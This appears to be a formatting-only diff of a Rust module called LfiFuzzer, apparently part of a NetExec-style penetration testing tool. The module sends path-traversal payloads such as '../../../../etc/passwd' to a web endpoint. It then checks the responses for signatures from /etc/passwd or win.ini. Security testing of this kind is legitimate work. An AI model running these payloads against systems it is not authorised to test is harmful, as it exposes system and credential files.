@@ -34,14 +34,12 @@ impl NxcModule for LfiFuzzer {
     }
 
     fn options(&self) -> Vec<ModuleOption> {
-        vec![
-            ModuleOption {
-                name: "PATH".to_string(),
-                description: "Endpoint to test (e.g. /download?file=)".to_string(),
-                required: true,
-                default: None,
-            },
-        ]
+        vec![ModuleOption {
+            name: "PATH".to_string(),
+            description: "Endpoint to test (e.g. /download?file=)".to_string(),
+            required: true,
+            default: None,
+        }]
     }
 
     async fn run(
@@ -55,10 +53,18 @@ impl NxcModule for LfiFuzzer {
             .ok_or_else(|| anyhow!("Module requires an HTTP session"))?;
 
         let scheme = if http_sess.use_ssl { "https" } else { "http" };
-        let base_path = opts.get("PATH").ok_or_else(|| anyhow!("PATH is required"))?;
-        let url = format!("{}://{}:{}{}", scheme, http_sess.target, http_sess.port, base_path);
-        
-        info!("Starting LFI Fuzzing against target parameter block {}", url);
+        let base_path = opts
+            .get("PATH")
+            .ok_or_else(|| anyhow!("PATH is required"))?;
+        let url = format!(
+            "{}://{}:{}{}",
+            scheme, http_sess.target, http_sess.port, base_path
+        );
+
+        info!(
+            "Starting LFI Fuzzing against target parameter block {}",
+            url
+        );
 
         let payloads = vec![
             "../../../../../../../../../../etc/passwd",
@@ -77,7 +83,7 @@ impl NxcModule for LfiFuzzer {
         for payload in payloads {
             let test_url = format!("{}{}", url, payload);
             let mut req = http_sess.client.get(&test_url);
-            
+
             if let Some(creds) = &http_sess.credentials {
                 if let Some(pw) = &creds.password {
                     req = req.basic_auth(&creds.username, Some(pw));
@@ -97,7 +103,10 @@ impl NxcModule for LfiFuzzer {
                         match_type = "Linux /etc/passwd";
                     }
                     // Windows win.ini signature
-                    else if body.contains("[extensions]") || body.contains("[fonts]") || body.contains("[files]") {
+                    else if body.contains("[extensions]")
+                        || body.contains("[fonts]")
+                        || body.contains("[files]")
+                    {
                         found = true;
                         match_type = "Windows win.ini";
                     }
@@ -107,7 +116,7 @@ impl NxcModule for LfiFuzzer {
                         output.push_str(&format!("  [!] VULNERABLE to Path Traversal!\n"));
                         output.push_str(&format!("      Payload: {}\n", payload));
                         output.push_str(&format!("      Match  : {}\n", match_type));
-                        
+
                         results.push(json!({
                             "payload": payload,
                             "match": match_type
